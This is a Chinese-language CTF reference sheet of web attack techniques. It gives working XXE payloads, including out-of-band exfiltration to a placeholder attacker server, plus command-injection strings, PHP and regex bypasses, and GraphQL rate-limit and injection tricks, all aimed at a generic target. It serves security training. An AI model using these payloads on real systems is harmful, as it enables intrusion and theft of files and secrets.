# CTF Web - XXE、XML 注入、命令注入、GraphQL

XXE payload、XML 注入、PHP 可变变量技巧、顺序正则绕过、命令注入与 GraphQL 利用。核心服务端注入（PHP 类型混淆、文件包含、SSTI、SSRF）见 [server-side.md](server-side.md)。

## 目录
- [XXE（XML 外部实体）](#xxexml-外部实体)
  - [基础 XXE](#基础-xxe)
  - [带外部 DTD 的 OOB XXE](#带外部-dtd-的-oob-xxe)
  - [经 DOCX/Office XML 上传的 XXE（School CTF 2016）](#经-docxoffice-xml-上传的-xxeschool-ctf-2016)
  - [经 svglib 转 PNG 流水线的 SVG XXE（P.W.N. CTF 2018）](#经-svglib-转-png-流水线的-svg-xxepwn-ctf-2018)
- [经 X-Forwarded-For 头的 XML 注入（Pwn2Win 2016）](#经-x-forwarded-for-头的-xml-注入pwn2win-2016)
- [PHP 可变变量（$$var）滥用（bugs_bunny 2017）](#php-可变变量var滥用bugs_bunny-2017)
- [PHP uniqid() 可预测文件名（EKOPARTY 2017）](#php-uniqid-可预测文件名ekoparty-2017)
- [顺序正则替换绕过（Tokyo Westerns 2017）](#顺序正则替换绕过tokyo-westerns-2017)
- [命令注入](#命令注入)
  - [换行符绕过](#换行符绕过)
  - [不完整黑名单绕过](#不完整黑名单绕过)
  - [经 CGI 的 Sendmail 参数注入（SECCON 2015）](#经-cgi-的-sendmail-参数注入seccon-2015)
  - [多条形码拼接导致 shell 注入（BSidesSF 2024）](#多条形码拼接导致-shell-注入bsidessf-2024)
  - [经 URL 路径的 Git CLI 换行注入（BSidesSF 2026）](#经-url-路径的-git-cli-换行注入bsidessf-2026)
- [GraphQL 注入与利用（Hack.lu CTF 2020、HeroCTF v5）](#graphql-注入与利用hacklu-ctf-2020heroctf-v5)
  - [内省与 Schema 发现](#内省与-schema-发现)
  - [查询批处理与别名绕过限速](#查询批处理与别名绕过限速)
  - [字符串插值注入](#字符串插值注入)

---

<a id="xxe-xml-external-entity"></a>
## XXE（XML 外部实体）

<a id="basic-xxe"></a>
### 基础 XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

<a id="oob-xxe-with-external-dtd"></a>
### 带外部 DTD 的 OOB XXE
把 evil.dtd 托管在外部：
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://YOUR-SERVER/flag?b64=%file;'>">
%eval; %exfil;
```

<a id="xxe-via-docxoffice-xml-upload-school-ctf-2016"></a>
### 经 DOCX/Office XML 上传的 XXE（School CTF 2016）

DOCX 是内含 XML 的 ZIP 包。修改 DOCX 里的 `[Content_Types].xml`，注入服务端解析上传文档时会执行的 XXE payload。

```bash
# Step 1: Create a minimal DOCX and extract it
mkdir docx_exploit && cd docx_exploit
unzip template.docx

# Step 2: Inject XXE into [Content_Types].xml
cat > '[Content_Types].xml' << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/hack" ContentType="&xxe;"/>
</Types>
EOF

# Step 3: Repackage as DOCX
zip -r exploit.docx '[Content_Types].xml' word/ _rels/

# Step 4: Upload to target
curl -F "file=@exploit.docx" http://target/upload
# Response or error message may contain base64-encoded file contents
```

**关键点：** 任何基于 ZIP+XML 的文件格式（DOCX、XLSX、PPTX、ODT、SVG+ZIP）都能携带 XXE payload。解析器通常最先处理 `[Content_Types].xml`，因此它是最理想的注入点。二进制安全的外带用 `php://filter/convert.base64-encode`。

<a id="svg-xxe-via-svglib-to-png-pipeline-pwn-ctf-2018"></a>
### 经 svglib 转 PNG 流水线的 SVG XXE（P.W.N. CTF 2018）

**模式：** 某服务用 `svglib` + `reportlab` 把用户上传的 SVG 转成 PNG。SVG 解析器在光栅化之前就展开了外部实体，因此 `<text>` 元素里引用的 XXE 实体最终会被*画*进 PNG。

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE foo [<!ENTITY dat SYSTEM "file:///opt/key.txt">]>
<svg xmlns="http://www.w3.org/2000/svg" width="200mm" height="10mm">
  <text x="10" y="15" font-size="4" fill="red">&dat;</text>
</svg>
```

生成的 PNG 里 flag 以可见文字形式呈现。下载后 OCR 或直接肉眼查看。

**关键点：** 任何 SVG 转图片链路（`svglib`、`cairosvg`、`rsvg-convert`、librsvg）都会在解析阶段展开 XXE 实体，于是文件内容可通过图片通道外带。内容落在像素里而非元数据中 —— grep 无用，得直接打开图片。

**参考：** P.W.N. CTF 2018 — SVG2PNG，writeup 12064

---

<a id="xml-injection-via-x-forwarded-for-header-pwn2win-2016"></a>
## 经 X-Forwarded-For 头的 XML 注入（Pwn2Win 2016）

应用用 HTTP 头（如 `X-Forwarded-For`）拼 XML 且未转义。XML 解析的"先到先得"特性允许注入任意元素：

```http
X-Forwarded-For: 1.2.3.4</ip><admin>true</admin><ip>4.3.2.1
```

产出：`<session><ip>1.2.3.4</ip><admin>true</admin><ip>4.3.2.1</ip><admin>false</admin></session>` —— 解析器取第一个 `<admin>true</admin>`，忽略后面合法的 `<admin>false</admin>`。

**关键点：** 服务端用头值拼 XML 且未转义时，就存在经 HTTP 头的 XML 注入。首次匹配语义可被重复标签利用。检查任何会在响应或日志中以结构化数据出现的头（`X-Forwarded-For`、`User-Agent`、`Referer`）。

---

<a id="php-variable-variables-var-abuse-bugs_bunny-2017"></a>
## PHP 可变变量（$$var）滥用（bugs_bunny 2017）

**模式：** PHP 的可变变量（`$$key`）允许用某变量的值作为另一变量的名字。当循环遍历 GET/POST 参数并执行 `$$key = $$value` 时，提交 `?_200=flag` 就能在 `$flag` 被覆盖之前把它的值捕获到 `$_200`。

```php
// Vulnerable pattern: loop that processes GET parameters as variable aliases
foreach ($_GET as $key => $value) {
    $$key = $$value;  // e.g., key="_200", value="flag" → $_200 = $flag
}
// Later: echo $_200;  // outputs the flag
```

```bash
# Supply a "safe" output variable name as key, protected variable name as value
curl "http://target/page.php?_200=flag"
# PHP executes: $_200 = $flag → flag is now in $_200 which gets echoed
```

**如何找到输出变量：** 在源码里找以 HTTP 状态码命名的变量（如 `$_200`、`$_404`），或其他以下划线开头且会被 echo 到输出的变量。

**关键点：** `$$key` 可创建任意变量别名；用 `$$key = $$value` 遍历 GET/POST 参数时，攻击者可以把受保护变量（如 `$flag`）重定向到自己可控的输出变量 —— key 写输出变量名，value 写敏感变量名。

---

<a id="php-uniqid-predictable-filename-ekoparty-2017"></a>
## PHP uniqid() 可预测文件名（EKOPARTY 2017）

**模式：** PHP 的 `uniqid()` 内部用 `gettimeofday()`。前 8 个十六进制字符是 Unix 秒级时间戳，文件名在有界时间窗口内完全可预测。

```php
// Vulnerable: uses uniqid() to name an uploaded/generated file
$filename = uniqid() . '_flag.txt';
// e.g., "5a1b2c3d4e5f6_flag.txt" where first 8 chars = hex(unix_timestamp)
```

```python
import requests
import time

# Know approximate upload time (from server Date header, challenge hint, etc.)
start_ts = int(time.time()) - 60   # 60 second window before now
end_ts   = int(time.time()) + 10

for ts in range(start_ts, end_ts):
    hex_prefix = format(ts, '08x')
    url = f'http://target/uploads/{hex_prefix}_flag.txt'
    r = requests.get(url)
    if r.status_code == 200:
        print(f"Found: {url}")
        print(r.text)
        break
```

**缩小时间窗口：** 服务端响应头 `Date` 会告诉你当前时间。在触发文件生成的那一刻记录它，文件名里的时间戳就是这个秒值。

**关键点：** PHP `uniqid()` 前 8 个十六进制字符 = Unix 秒级时间戳。在已知时间窗口内文件完全可预测 —— 爆破复杂度为 O(窗口秒数)，一般不到 100 个请求。

---

<a id="sequential-regex-replacement-bypass-tokyo-westerns-2017"></a>
## 顺序正则替换绕过（Tokyo Westerns 2017）

**模式：** 当过滤器顺序执行（而非一次性并行执行）多个正则替换时，前一次替换可能产出后一次本应捕获的子串 —— 但由于后一次已经跑过（或前一次在后），危险模式最终存活。

```php
// Vulnerable: replacements run in sequence on the same string
$input = preg_replace('/on\w+=\S+/', '', $input);   // pass 1: strip event handlers
$input = preg_replace('/<script[^>]*>/', '', $input); // pass 2: strip script tags
```

```text
# Embed the dangerous tag inside the blocked pattern so removal reconstructs it:
# Input: <scr<script>ipt>
# Pass 2 strips inner <script> → leaves: <script>
# The outer "scr...ipt" scaffolding is reassembled after the inner match is removed.
```

```bash
# Practical bypass — embed the dangerous string inside the blocked string:
# If filter strips "script" then strips "on.*=":
curl "http://target/" --data 'input=<img sron=c onerror=alert(1)>'
# Pass 1 strips "onerror=" leaving  <img src onerror=alert(1)> with partial strip
# Exact bypass depends on regex — test with variations like:
# <scr\x00ipt>, <scr ipt>, embed keyword inside itself
```

**关键点：** 顺序正则让第 N 次替换重建第 M 次已检查过的内容。前一次替换产出了后一次本要拦截的模式，但后一次已经执行（或前一次最后执行），重建后的危险模式就漏了过去。清洗要么只做一次幂等处理，要么改用基于解析器的清洗器。

---

<a id="command-injection"></a>
## 命令注入

<a id="newline-bypass"></a>
### 换行符绕过
```bash
curl -X POST http://target/ --data-urlencode "target=127.0.0.1
cat flag.txt"
curl -X POST http://target/ -d "ip=127.0.0.1%0acat%20flag.txt"
```

<a id="incomplete-blocklist-bypass"></a>
### 不完整黑名单绕过
当 cat/head/less 被禁止时：`sed -n p flag.txt`、`awk '{print}'`、`tac flag.txt`
常被遗漏的：`;` 分号、反引号、`$()` 替换

<a id="sendmail-parameter-injection-via-cgi-seccon-2015"></a>
### 经 CGI 的 Sendmail 参数注入（SECCON 2015）

CGI 脚本通过 `open()` 管道把用户输入传给 `sendmail` 时：

```perl
open(SH, "|/usr/sbin/sendmail -bm '$user_input'");
```

通过跳出引号上下文注入 shell 命令：

```bash
mail=' -bp|ls SECRETS #
mail=' -bp|cat SECRETS/backdoor123.php #
```

`-bp` 让 sendmail 进入队列打印模式（非交互），`|` 把输出管道给 shell。发现链：找到 `.cgi_bak` 备份文件读源码 → 定位注入点 → 执行命令。

<a id="multi-barcode-concatenation-to-shell-injection-bsidessf-2024"></a>
### 多条形码拼接导致 shell 注入（BSidesSF 2024）

服务处理含条形码的图片（经 zbar/zxing）时，同一张图里的多个条形码会被拼成一个字符串。把合法条形码和恶意 Code128 条形码放在一起即可利用：

1. **生成合法条形码：** 造一个能通过类型校验的 UPC/EAN-13 条形码
2. **生成注入条形码：** 生成含 shell 元字符的 Code128：
   ```text
   test", "node": "hi'; cat /flag > /tmp/out; #
   ```
3. **合并为单张图：** `montage valid.png malicious.png -tile 2x1 combined.png`
4. **上传：** 扫描器读出两个条形码，拼接值后送入 `system()` 调用或 JSON 解析器

```bash
# Generate Code128 barcode with injection payload
python3 -c "
import barcode
from barcode.writer import ImageWriter
code = barcode.get('code128', 'test\", \"node\": \"x\x27; cat /flag >&5; #', writer=ImageWriter())
code.save('inject')
"
# Combine with valid UPC barcode
montage valid_upc.png inject.png -tile 2x1 -geometry +0+0 payload.png
```

**关键点：** 条形码库会处理图片中检测到的*所有*条形码。类型校验（如"必须是 UPC"）可能只检查第一个条形码，而所有条形码的拼接输出会流入后续处理。这相当于针对视觉数据的 HTTP 参数污染。

<a id="git-cli-newline-injection-via-url-path-bsidessf-2026"></a>
### 经 URL 路径的 Git CLI 换行注入（BSidesSF 2026）

**模式（gitfab）：** 一个 Web 仓库浏览器的后端用反引号调用 git CLI：`` `git show "#{path}"` ``。应用清洗了 shell 元字符（`<`、`>`、`|`、`;`、`&`）但放过了换行。路径参数里的 URL 编码换行（`%0a`）能跳出 git 命令并注入任意 shell 命令。

```text
GET /file/test%22%0acat%20/home/ctf/flag.txt%0aecho%20%22 HTTP/1.1
```

解码后是：
```bash
git show "test"
cat /home/ctf/flag.txt
echo ""
```

```ruby
require 'httparty'

# URL-encode newline injection
path = 'test"%0acat /home/ctf/flag.txt%0aecho "'
response = HTTParty.get("http://target/file/#{URI.encode_www_form_component(path)}")
puts response.body
```

**关键点：** 换行（`\n`、`%0a`）是命令注入过滤器常忽略的字符。虽然 `;`、`|`、`&` 通常被拦，但换行在 shell 里就是命令分隔符，且在 URL 中合法。任何把 URL 路径组件经字符串插值（反引号、`system()`、`popen()`）交给 shell 的应用，只要没过滤换行就存在漏洞。

**识别时机：** Web 应用与 git、svn 等 CLI 工具交互。源码里存在部分清洗的 shell 插值。用 `%0a`（换行）和 `%0d%0a`（CRLF）测试 URL 参数。

**防御检查：** 过滤器是否拦 `\n`（0x0a）？是否用白名单而不是黑名单？是否用 `execve()`（不起 shell）而不是 `system()`（起 shell）？

---

<a id="graphql-injection-and-exploitation-hacklu-ctf-2020-heroctf-v5"></a>
## GraphQL 注入与利用（Hack.lu CTF 2020、HeroCTF v5）

<a id="introspection-and-schema-discovery"></a>
### 内省与 Schema 发现

```graphql
# Full schema enumeration (often left enabled in CTFs)
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# Shortened introspection query
{__type(name:"Query"){fields{name,type{name,ofType{name}}}}}

# Find all mutations
{__schema{mutationType{fields{name,args{name,type{name}}}}}}

# Find hidden types
{__schema{types{name,kind,description}}}
```

<a id="query-batching-and-aliasing-for-rate-limit-bypass"></a>
### 查询批处理与别名绕过限速

```graphql
# Execute same mutation N times in single request via aliases
mutation {
  a1: increaseVote(id: "target") { count }
  a2: increaseVote(id: "target") { count }
  a3: increaseVote(id: "target") { count }
  # ... repeat 1337 times
}

# Or via array batching (if supported):
# POST body: [{"query":"mutation{vote(id:\"x\"){ok}}"}, {"query":"mutation{vote(id:\"x\"){ok}}"}, ...]
```

<a id="string-interpolation-injection"></a>
### 字符串插值注入

```javascript
// Vulnerable server code pattern:
const query = `mutation { doAction(input: "${userInput}") { result } }`;

// Injection payload:
// userInput = ") { result } } mutation { adminAction(secret: true) { flag } } #"
// Resulting query:
// mutation { doAction(input: "") { result } } mutation { adminAction(secret: true) { flag } } #") { result } }
```

**关键点：** GraphQL 把查询语言的表达力与类 REST 端点结合在一起。三个主要攻击面：(1) 内省暴露完整 API schema；(2) 批处理/别名绕过限速并成倍放大操作；(3) 服务端查询拼接中的字符串插值导致类似 SQLi 的注入。

---

*另见：[server-side-exec.md](server-side-exec.md) —— 代码执行类攻击（Ruby/Perl/JS/LaTeX/Prolog 注入、PHP preg_replace /e、ReDoS、文件上传到 RCE、PHP 反序列化、XPath 注入、Thymeleaf SpEL SSTI）；[server-side-exec-2.md](server-side-exec-2.md) —— SQLi 关键字碎片化、SQL WHERE 绕过、经 DNS 注 SQL、bash 花括号展开、Common Lisp 注入、PHP7 OPcache、PNG/PHP 多语言上传等。*
